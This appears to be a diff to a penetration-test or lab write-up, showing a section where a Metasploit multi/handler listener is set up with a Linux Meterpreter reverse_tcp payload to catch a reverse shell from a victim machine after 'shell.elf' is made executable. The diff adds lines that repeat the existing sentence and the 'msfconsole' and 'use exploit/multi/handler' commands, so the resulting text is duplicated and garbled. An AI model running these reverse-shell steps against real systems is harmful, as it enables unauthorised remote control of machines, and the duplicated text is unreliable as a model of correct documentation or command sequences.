@@ -334,8 +334,11 @@ chmod +x shell.elf
 
 ### **Payload Execution Metasploit**
 While the payload was being transferred and prepared on the victim machine, a listener was set up on the attacking machine using *Metasploit's `multi/handler` module*. This module is designed to catch incoming reverse shell connections.  
+While the payload was being transferred and prepared on the victim machine, a listener was set up on the attacking machine using *Metasploit's `multi/handler` module*. This module is designed to catch incoming reverse shell connections.  
 
 ```bash
+msfconsole
+use exploit/multi/handler
 msfconsole
 use exploit/multi/handler
 set PAYLOAD linux/x86/meterpreter/reverse_tcp
